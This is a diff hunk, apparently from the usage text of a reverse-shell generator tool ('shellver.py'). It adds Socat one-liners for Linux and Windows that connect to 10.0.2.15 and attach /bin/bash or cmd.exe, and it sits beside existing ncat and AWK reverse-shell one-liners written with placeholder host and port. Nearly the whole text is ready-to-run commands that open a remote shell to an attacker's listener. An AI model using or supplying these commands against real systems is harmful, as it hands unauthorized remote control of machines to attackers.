@@ -93,6 +93,12 @@ rlwrap ./shellver.py shell
 ║ ncat --udp xxx yyy -e /bin/bash
 ╚═══════════════════════════════════════════════════
 
+╔Socat══════════════════════════════════════════════
+║ socat -d -d -d TCP4:10.0.2.15:4 EXEC:/bin/bash
+╠══════════════╦════════════════════════════════════
+║ Windows only ║ socat -d -d TCP4:10.0.2.15:4 EXEC:'cmd.exe',pipes
+╚══════════════╩════════════════════════════════════
+
 ╔AWK════════════════════════════════════════════════
 ║ awk 'BEGIN {s = "/inet/tcp/0/xxx/yyy"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ╚═══════════════════════════════════════════════════
